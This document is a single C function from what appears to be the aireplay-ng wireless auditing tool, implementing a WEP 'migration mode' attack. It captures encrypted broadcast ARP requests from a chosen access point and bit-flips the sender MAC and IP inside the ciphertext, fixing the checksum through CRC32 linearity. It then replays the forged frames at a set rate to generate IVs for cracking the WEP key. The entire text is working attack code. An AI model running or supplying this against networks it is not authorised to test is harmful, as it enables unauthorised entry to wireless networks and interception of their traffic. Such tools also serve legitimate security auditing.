int do_attack_migmode( void )
{
    int nb_bad_pkt;
    int arp_off1, arp_off2;
    int i, n, caplen, nb_arp, z;
    long nb_pkt_read, nb_arp_tot, nb_ack_pkt;
    unsigned char flip[4096];
    unsigned char senderMAC[6];

    time_t tc;
    float f, ticks[3];
    struct timeval tv;
    struct timeval tv2;
    struct tm *lt;

    FILE *f_cap_out;
    struct pcap_file_header pfh_out;
    struct pcap_pkthdr pkh;
    struct ARP_req * arp;

    if ( opt.ringbuffer )
        arp = (struct ARP_req*) malloc( opt.ringbuffer * sizeof( struct ARP_req ) );
    else
        arp = (struct ARP_req*) malloc( sizeof( struct ARP_req ) );

    /* capture only WEP data to broadcast address */

    opt.f_type    = 2;
    opt.f_subtype = 0;
    opt.f_iswep   = 1;
    opt.f_fromds  = 1;

    if(getnet(NULL, 1, 1) != 0)
        return 1;

    if( memcmp( opt.f_bssid, NULL_MAC, 6 ) == 0 )
    {
        printf( "Please specify a BSSID (-b).\n" );
        return( 1 );
    }
    /* create and write the output pcap header */

    gettimeofday( &tv, NULL );

    pfh_out.magic         = TCPDUMP_MAGIC;
    pfh_out.version_major = PCAP_VERSION_MAJOR;
    pfh_out.version_minor = PCAP_VERSION_MINOR;
    pfh_out.thiszone      = 0;
    pfh_out.sigfigs       = 0;
    pfh_out.snaplen       = 65535;
    pfh_out.linktype      = LINKTYPE_IEEE802_11;

    lt = localtime( (const time_t *) &tv.tv_sec );

    memset( strbuf, 0, sizeof( strbuf ) );
    snprintf( strbuf,  sizeof( strbuf ) - 1,
              "replay_arp-%02d%02d-%02d%02d%02d.cap",
              lt->tm_mon + 1, lt->tm_mday,
              lt->tm_hour, lt->tm_min, lt->tm_sec );

    printf( "Saving ARP requests in %s\n", strbuf );

    if( ( f_cap_out = fopen( strbuf, "wb+" ) ) == NULL )
    {
        perror( "fopen failed" );
        return( 1 );
    }

    n = sizeof( struct pcap_file_header );

    if( fwrite( &pfh_out, n, 1, f_cap_out ) != 1 )
    {
        perror( "fwrite failed\n" );
        return( 1 );
    }

    fflush( f_cap_out );

    printf( "You should also start airodump-ng to capture replies.\n" );
    printf( "Remember to filter the capture to only keep WEP frames: ");
    printf( " \"tshark -R 'wlan.wep.iv' -r capture.cap -w outcapture.cap\"\n");
    //printf( "Remember to filter the capture to keep only broadcast From-DS frames.\n");

    if(opt.port_in <= 0)
    {
        /* avoid blocking on reading the socket */
        if( fcntl( dev.fd_in, F_SETFL, O_NONBLOCK ) < 0 )
        {
            perror( "fcntl(O_NONBLOCK) failed" );
            return( 1 );
        }
    }

    memset( ticks, 0, sizeof( ticks ) );

    tc = time( NULL ) - 11;

    nb_pkt_read = 0;
    nb_bad_pkt  = 0;
    nb_ack_pkt  = 0;
    nb_arp      = 0;
    nb_arp_tot  = 0;
    arp_off1    = 0;
    arp_off2    = 0;

    while( 1 )
    {
        /* sleep until the next clock tick */

        if( dev.fd_rtc >= 0 )
        {
            if( read( dev.fd_rtc, &n, sizeof( n ) ) < 0 )
            {
                perror( "read(/dev/rtc) failed" );
                return( 1 );
            }

            ticks[0]++;
            ticks[1]++;
            ticks[2]++;
        }
        else
        {
            gettimeofday( &tv,  NULL );
            usleep( 1000000/RTC_RESOLUTION );
            gettimeofday( &tv2, NULL );

            f = 1000000 * (float) ( tv2.tv_sec  - tv.tv_sec  )
                        + (float) ( tv2.tv_usec - tv.tv_usec );

            ticks[0] += f / ( 1000000/RTC_RESOLUTION );
            ticks[1] += f / ( 1000000/RTC_RESOLUTION );
            ticks[2] += f / ( 1000000/RTC_RESOLUTION );
        }

        if( ticks[1] > (RTC_RESOLUTION/10) )
        {
            ticks[1] = 0;
            printf( "\rRead %ld packets (%ld ARPs, %ld ACKs), "
                    "sent %ld packets...(%d pps)\r",
                    nb_pkt_read, nb_arp_tot, nb_ack_pkt, nb_pkt_sent, (int)((double)nb_pkt_sent/((double)ticks[0]/(double)RTC_RESOLUTION)) );
            fflush( stdout );
        }

        if( ( ticks[2] * opt.r_nbpps ) / RTC_RESOLUTION >= 1 )
        {
            /* threshold reach, send one frame */

            ticks[2] = 0;

            if( nb_arp > 0 )
            {
                if( nb_pkt_sent == 0 )
                    ticks[0] = 0;

                if( send_packet( arp[arp_off1].buf,
                                 arp[arp_off1].len ) < 0 )
                    return( 1 );

                if( ((double)ticks[0]/(double)RTC_RESOLUTION)*(double)opt.r_nbpps > (double)nb_pkt_sent  )
                {
                    if( send_packet( arp[arp_off1].buf,
                                    arp[arp_off1].len ) < 0 )
                        return( 1 );
                }

                if( ++arp_off1 >= nb_arp )
                    arp_off1 = 0;
            }
        }

        /* read a frame, and check if it's an ARP request */

        if( opt.s_file == NULL )
        {
            gettimeofday( &tv, NULL );

            caplen = read_packet( h80211, sizeof( h80211 ), NULL );

            if( caplen  < 0 ) return( 1 );
            if( caplen == 0 ) continue;
        }
        else
        {
            n = sizeof( pkh );

            if( fread( &pkh, n, 1, dev.f_cap_in ) != 1 )
            {
                opt.s_file = NULL;
                continue;
            }

            if( dev.pfh_in.magic == TCPDUMP_CIGAM ) {
                SWAP32( pkh.caplen );
                SWAP32( pkh.len );
            }

            tv.tv_sec  = pkh.tv_sec;
            tv.tv_usec = pkh.tv_usec;

            n = caplen = pkh.caplen;

            if( n <= 0 || n > (int) sizeof( h80211 ) || n > (int) sizeof( tmpbuf ) )
            {
                printf( "\r\33[KInvalid packet length %d.\n", n );
                opt.s_file = NULL;
                continue;
            }

            if( fread( h80211, n, 1, dev.f_cap_in ) != 1 )
            {
                opt.s_file = NULL;
                continue;
            }

            if( dev.pfh_in.linktype == LINKTYPE_PRISM_HEADER )
            {
                /* remove the prism header */

                if( h80211[7] == 0x40 )
                    n = 64;
                else
                    n = *(int *)( h80211 + 4 );

                if( n < 8 || n >= (int) caplen )
                    continue;

                memcpy( tmpbuf, h80211, caplen );
                caplen -= n;
                memcpy( h80211, tmpbuf + n, caplen );
            }

            if( dev.pfh_in.linktype == LINKTYPE_RADIOTAP_HDR )
            {
                /* remove the radiotap header */

                n = *(unsigned short *)( h80211 + 2 );

                if( n <= 0 || n >= (int) caplen )
                    continue;

                memcpy( tmpbuf, h80211, caplen );
                caplen -= n;
                memcpy( h80211, tmpbuf + n, caplen );
            }

            if( dev.pfh_in.linktype == LINKTYPE_PPI_HDR )
            {
                /* remove the PPI header */

                n = le16_to_cpu(*(unsigned short *)( h80211 + 2));

                if( n <= 0 || n>= (int) caplen )
                    continue;

                /* for a while Kismet logged broken PPI headers */
                if ( n == 24 && le16_to_cpu(*(unsigned short *)(h80211 + 8)) == 2 )
                    n = 32;

                if( n <= 0 || n>= (int) caplen )
                    continue;

                memcpy( tmpbuf, h80211, caplen );
                caplen -= n;
                memcpy( h80211, tmpbuf + n, caplen );
            }
        }

        nb_pkt_read++;

        /* check if it's a disas. or deauth packet */

        if( ( h80211[0] == 0xC0 || h80211[0] == 0xA0 ) &&
            ! memcmp( h80211 + 4, opt.r_smac, 6 ) )
        {
            nb_bad_pkt++;

            if( nb_bad_pkt > 64 && time( NULL ) - tc >= 10 )
            {
                printf( "\33[KNotice: got a deauth/disassoc packet. Is the "
                        "source MAC associated ?\n" );

                tc = time( NULL );
                nb_bad_pkt = 0;
            }
        }

        if( h80211[0] == 0xD4 &&
            ! memcmp( h80211 + 4, opt.f_bssid, 6 ) )
        {
            nb_ack_pkt++;
        }

        /* check if it's a potential ARP request */

        opt.f_minlen = opt.f_maxlen = 68;

        if( filter_packet( h80211, caplen ) == 0 )
            goto add_arp;

        opt.f_minlen = opt.f_maxlen = 86;

        if( filter_packet( h80211, caplen ) == 0 )
        {
add_arp:
            z = ( ( h80211[1] & 3 ) != 3 ) ? 24 : 30;
            if ( ( h80211[0] & 0x80 ) == 0x80 ) /* QoS */
                z+=2;

            switch( h80211[1] & 3 )
            {
                case  2: /* FromDS */
                {
                    if(memcmp(h80211 + 4, BROADCAST, 6) == 0)
                    {
                        /* backup sender MAC */

                        memset( senderMAC, 0, 6 );
                        memcpy( senderMAC, h80211 + 16, 6 );

                        /* rewrite to a ToDS packet */

                        memcpy( h80211 + 4, opt.f_bssid,  6 );
                        memcpy( h80211 + 10, opt.r_smac,  6 );
                        memcpy( h80211 + 16, BROADCAST, 6 );

                        h80211[1] = 0x41;   /* ToDS & WEP  */
                    }
                    else
                    {
                        nb_arp_tot++;
                        continue;
                    }

                    break;
                }
                default:
                    continue;
            }

//             h80211[0] = 0x08;   /* normal data */

            /* if same IV, perhaps our own packet, skip it */

            for( i = 0; i < nb_arp; i++ )
            {
                if( memcmp( h80211 + z, arp[i].buf + arp[i].hdrlen, 4 ) == 0 )
                    break;
            }

            if( i < nb_arp )
                continue;

            if( caplen > 128)
                continue;
            /* add the ARP request in the ring buffer */

            nb_arp_tot++;

            /* Ring buffer size: by default: 8 ) */

            if( nb_arp >= opt.ringbuffer && opt.ringbuffer > 0)
                continue;
            else {

                if( ( arp[nb_arp].buf = malloc( 128 ) ) == NULL ) {
                    perror( "malloc failed" );
                    return( 1 );
                }

                memset(flip, 0, 4096);

                /* flip the sender MAC to convert it into the source MAC  */
                flip[16] ^= (opt.r_smac[0] ^ senderMAC[0]);
                flip[17] ^= (opt.r_smac[1] ^ senderMAC[1]);
                flip[18] ^= (opt.r_smac[2] ^ senderMAC[2]);
                flip[19] ^= (opt.r_smac[3] ^ senderMAC[3]);
                flip[20] ^= (opt.r_smac[4] ^ senderMAC[4]);
                flip[21] ^= (opt.r_smac[5] ^ senderMAC[5]);
                flip[25] ^= ((rand() % 255)+1); //flip random bits in last byte of sender IP

                add_crc32_plain(flip, caplen-z-4-4);
                for(i=0; i<caplen-z-4; i++)
                {
                    (h80211+z+4)[i] ^= flip[i];
                }

                memcpy( arp[nb_arp].buf, h80211, caplen );
                arp[nb_arp].len = caplen;
                arp[nb_arp].hdrlen = z;
                nb_arp++;

                pkh.tv_sec  = tv.tv_sec;
                pkh.tv_usec = tv.tv_usec;
                pkh.caplen  = caplen;
                pkh.len     = caplen;

                n = sizeof( pkh );

                if( fwrite( &pkh, n, 1, f_cap_out ) != 1 ) {
                    perror( "fwrite failed" );
                    return( 1 );
                }

                n = pkh.caplen;

                if( fwrite( h80211, n, 1, f_cap_out ) != 1 ) {
                    perror( "fwrite failed" );
                    return( 1 );
                }

                fflush( f_cap_out );
            }
        }
    }

    return( 0 );
}